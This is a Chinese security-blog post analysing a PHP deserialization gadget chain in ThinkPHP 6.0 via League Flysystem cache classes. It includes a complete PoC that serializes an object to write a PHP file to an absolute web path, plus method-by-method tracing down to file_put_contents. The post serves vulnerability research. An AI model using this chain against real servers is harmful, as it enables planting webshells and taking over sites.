# Thinkphp 6.0反序列化链再挖掘

阅读量 **1411536**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-12-10 15:30:20

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t0148482efe697be613.jpg)

## 前言

之前分析了thinkphp
5.1,5.2,6.0的反序列化pop链，觉得师傅们实在是太厉害了，也没有想着再去自己挖掘，但是最近偶然间看到有师傅发了一条新的tp6.0的利用链出来,我也就寻思着能不能自己挖一挖，于是有了这篇文章

## 分析

先给出利用链及poc:

    
    
    LeagueFlysystemCachedStorageAbstractCache --> destruct()
    LeagueFlysystemCachedStorageAdapter --> save()
    LeagueFlysystemAdapterLocal --> write()
    

poc:

    
    
    <?php
    
    namespace LeagueFlysystemAdapter{
        abstract class AbstractAdapter{
            protected $pathPrefix;
            function __construct()
            {
                $this->pathPrefix = '/';
            }
        }
        class Local extends AbstractAdapter{
    
        }
    }
    
    namespace LeagueFlysystemCachedStorage{
        use LeagueFlysystemAdapterLocal;
        abstract class AbstractCache{
            protected $autosave = false;
            protected $cache = [];
            function __construct()
            {
                $this->autosave = false;
                $this->cache = ["axin"=>"<?php phpinfo();?>"];
            }
        }
    
        class Adapter extends AbstractCache{
            protected $adapter;
            protected $file;
            function __construct()
            {
                parent::__construct();
                $this->adapter = new Local();
                $this->file = '/opt/lampp/htdocs/axin.php';
            }
        }
    }
    
    namespace {
        use LeagueFlysystemCachedStorageAdapter;
        echo urlencode(base64_encode(serialize(new Adapter())));
    }
    

从poc中可以大概看出来我的这条利用链只是能够写入shell,不像其他大师傅们那些利用链可以直接执行命令，所以要弱鸡一点～

这次的利用链还是从常规的`__destruct()`以及`__weakup()`入手，经过全局搜索，最后锁定`LeagueFlysystemCachedStorageAbstractCache`类的`__destruct`方法：

    
    
        public function __destruct()
        {
            if (! $this->autosave) {
                $this->save();
            }
        }
    

为了执行save，我们令`$this->autosave=false`,然后跟进save(),由于AbstractCache是一个抽象类，没有实现save方法，我们需要找到一个实现了save方法的子类（在phpstorm,鼠标右键类名，点击find
usages可以找到类出现的地方，也就可以找到相关子类）：

![](https://p0.ssl.qhimg.com/t013b562356909f7303.png)

我这里利用的是Adapter类，其实很多子类都可以形成利用链，但是我感觉和之前师傅们挖的利用链有点撞车了，所以就不说其他的链了。我们看一下Adapter类的save方法：

    
    
        public function save()
        {
            echo "save执行!<br>";
            $config = new Config();
            $contents = $this->getForStorage(); //$contents完全可控
            echo '此时$contents的值:'.$contents."<br>";
            if ($this->adapter->has($this->file)) {
                $this->adapter->update($this->file, $contents, $config);
            } else {
                $this->adapter->write($this->file, $contents, $config);
            }
        }
    

上面的几处echo是我在调试poc时自己添加的，当我看到这里的write的时候我就感觉可能会存在文件写入操作，这里的write（）的参数`file`可控，`$config`不可控，我们看一下`$contents`是否可控，跟进getForStorage():

    
    
        public function getForStorage()
        {
            echo "getForStorage执行！<br>";
            $cleaned = $this->cleanContents($this->cache);
    
            return json_encode([$cleaned, $this->complete, $this->expire]);  //[{"axin":"<?php phpinfo();?>"},[],null]
        }
    

可以看到这里返回的值`$this->complete,$this->expire`都可以控制，我们再看看`$cleaned`，进入cleanContents():

    
    
        public function cleanContents(array $contents)
        {
            $cachedProperties = array_flip([
                'path', 'dirname', 'basename', 'extension', 'filename',
                'size', 'mimetype', 'visibility', 'timestamp', 'type',
            ]);
    
            foreach ($contents as $path => $object) {      // $contents=["axin"=>'<?php phpinfo();?>']
                if (is_array($object)) {
                    $contents[$path] = array_intersect_key($object, $cachedProperties);
                }
            }
    
            return $contents; //$contents=["axin"=>'<?php phpinfo();?>']
        }
    

由于参数我们可以控制，这里直接返回了我们传入的值，也就是getForStorage()函数中返回值我们是可以控制的，只不过进行了json转换，但是不影响我们后续利用，回到save函数，`$this->adapter->write($this->file,
$contents,
$config);`中前两个参数可控，而且`$this->adapter`可控，只要找到一个wirte方法有问题的类，我们就可以收工了，但是还要注意一点，这里要想执行到write()的前提是`$this->adapter->has($this->file)==false`,所以我们需要找的这个类不仅要实现了has与write方法，还要能够控制has方法的返回值为false

最终我定位到了LeagueFlysystemAdapterLocal类，我们看一下它的has方法：

    
    
        public function has($path) // $path可控
        {
            $location = $this->applyPathPrefix($path); //完全可控
    
            return file_exists($location);
        }
    

看来只是判断我们传入的路径文件是否存在，不过在调用file_exists()之前，给路径添加了个前缀，applyPathPrefix：

    
    
        public function applyPathPrefix($path)
        {
            return $this->getPathPrefix() . ltrim($path, '\/');
        }
    

用什么东西和我们的路径拼接了起来，继续看getPathPrefix() ：

    
    
        public function getPathPrefix()
        {
            return $this->pathPrefix;
        }
    

而这里的`$this->pathPrefix`我们是可以控制的，所以回到has函数,只要我们输入的路径文件不存在，has就会返回false,就会执行到write():

    
    
        public function write($path, $contents, Config $config)
        {
            echo "进入write函数!<br>";
            $location = $this->applyPathPrefix($path);
            echo '$location的值为：'.$location."<br>";
            $this->ensureDirectory(dirname($location));
            if (($size = file_put_contents($location, $contents, $this->writeFlags)) === false) {
                return false;
            }
    
            $type = 'file';
            $result = compact('contents', 'type', 'size', 'path');
    
            if ($visibility = $config->get('visibility')) {
                $result['visibility'] = $visibility;
                $this->setVisibility($path, $visibility);
            }
    
            return $result;
        }
    

可以看到这里执行了file_put_contents(),而且参数就是write函数的前两个参数，与`$config`无关，所以之前我们不能控制config也就不影响这里的shell写入。  
通过之前的分析我们知道`applyPathPrefix()`的返回值我们是可控的，也就是`$location`可控，然后`$contents`就是之前json_encode()之后的那个值，所以file_put_contents的关键参数都是可控的，但是以防万一，我们还是看看ensureDirectory（）:

    
    
        protected function ensureDirectory($root)
        {
    
            if ( ! is_dir($root)) {
                echo "ensureDirectory执行！<br>";
                $umask = umask(0);
    
                if ( ! @mkdir($root, $this->permissionMap['dir']['public'], true)) {
                    $mkdirError = error_get_last();
                }
    
                umask($umask);
                clearstatcache(false, $root);
    
                if ( ! is_dir($root)) {
                    $errorMessage = isset($mkdirError['message']) ? $mkdirError['message'] : '';
                    throw new Exception(sprintf('Impossible to create the root directory "%s". %s', $root, $errorMessage));
                }
            }
        }
    

可以看到，这个函数并不影响我们的利用链，至此整条利用链结束，这条利用链比较难受的地方就是得知道网站绝对路径。

效果演示：自己构造一个反序列化输入点，发送请求(页面的输出是我自己方便调试打印的)

![](https://p0.ssl.qhimg.com/t01f6849105697f43d9.png)

文件成功写入：

![](https://p1.ssl.qhimg.com/t01a21a85d50e69ae53.png)

ps:文章写了两遍，第一次快写完的时候电脑卡死了～一直以为安全客的编辑器能够实时保存文章，但是当我重启的时候发现我想多了，希望安全客可以考虑实时保存文章，写作体验更好^^（在做了.jpg）

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **阿信** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/194269](/post/id/194269)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [PHP](/tag/PHP)
  * [反序列化](/tag/反序列化)
  * [ThinkPHP](/tag/ThinkPHP)

 **+1** __8赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/fIsIdkaebDRWUxUVMFxrUic8A8gqtXUK9icHTF0UVhfQljGWQgpibJQ2icibDJu2Y9AEiaYODG97JWnn1XloWnmzj2eA/132)
阿信

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

